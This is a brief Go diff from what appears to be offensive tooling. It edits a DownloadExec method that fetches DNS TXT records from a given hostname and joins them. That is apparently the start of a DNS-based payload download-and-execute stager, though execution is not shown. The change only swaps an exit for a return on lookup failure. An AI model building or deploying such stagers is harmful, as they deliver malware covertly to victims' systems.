@@ -12,7 +12,7 @@ type DnsTXTDownload struct {
 func (d *DnsTXTDownload) DownloadExec(hostname string) {
 	recs, err := net.LookupTXT(hostname)
 	if err != nil {
-		os.Exit(0)
+		return
 	}
 
 	data := strings.Join(recs, "")
